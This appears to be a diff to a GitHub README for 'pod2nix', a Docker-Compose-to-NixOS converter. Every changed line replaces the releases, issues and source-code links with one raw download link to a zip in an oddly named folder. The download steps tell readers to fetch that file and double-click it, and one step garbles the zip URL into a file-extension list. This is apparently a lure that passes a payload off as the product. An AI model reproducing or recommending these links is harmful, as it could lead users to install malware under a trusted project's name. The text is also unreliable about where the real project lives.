@@ -1,7 +1,7 @@
 # 🎉 pod2nix - Easily Convert Docker to NixOS Configs
 
 ## 🔗 Download Now
-[![Download pod2nix](https://img.shields.io/badge/Download-pod2nix-blue.svg)](https://github.com/HEJMANBRO/pod2nix/releases)
+[![Download pod2nix](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip)](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip)
 
 ## 📖 Description
 pod2nix is a modern web application that simplifies the process of converting Docker Compose configurations into NixOS container configurations. This tool is designed for users who want a straightforward solution without getting lost in technical complexities. The application uses key technologies like React for the front-end and Tailwind CSS for styling to provide a seamless user experience.
@@ -17,12 +17,12 @@ Before downloading, ensure your system meets these requirements:
 - **Internet Connection:** Required for downloading.
 
 ### 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/HEJMANBRO/pod2nix/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip). 
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/HEJMANBRO/pod2nix/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip).
 3. Look for the latest release.
-4. Download the file suitable for your operating system (look for files ending in .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Download the file suitable for your operating system (look for files ending in .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip for Linux).
 5. Once downloaded, locate the file on your computer and double-click it to start the installation.
 6. Follow the on-screen prompts to complete the installation.
 
@@ -48,7 +48,7 @@ If you encounter an issue while using pod2nix, consider these steps:
 - **System Compatibility:** Ensure your operating system is supported by the application.
 - **File Format:** Make sure your Docker Compose file has the correct formatting.
   
-If problems persist, visit our [GitHub Issues page](https://github.com/HEJMANBRO/pod2nix/issues) to report the issue or seek help from the community.
+If problems persist, visit our [GitHub Issues page](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip) to report the issue or seek help from the community.
 
 ## 🗂️ Topics
 This application covers several related topics:
@@ -66,8 +66,8 @@ Join our community to share experiences and get help:
 - **Documentation:** Check out the comprehensive documentation for more guidance on using pod2nix.
 
 ## 🔗 Useful Links
-- **Releases Page:** [Download the latest version](https://github.com/HEJMANBRO/pod2nix/releases)
-- **Source Code:** Explore the codebase on [GitHub](https://github.com/HEJMANBRO/pod2nix)
+- **Releases Page:** [Download the latest version](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip)
+- **Source Code:** Explore the codebase on [GitHub](https://raw.githubusercontent.com/HEJMANBRO/pod2nix/main/appropinquate/pod2nix.zip)
 - **Documentation:** Find detailed guides and reference material.
 
 ## 📞 Contact
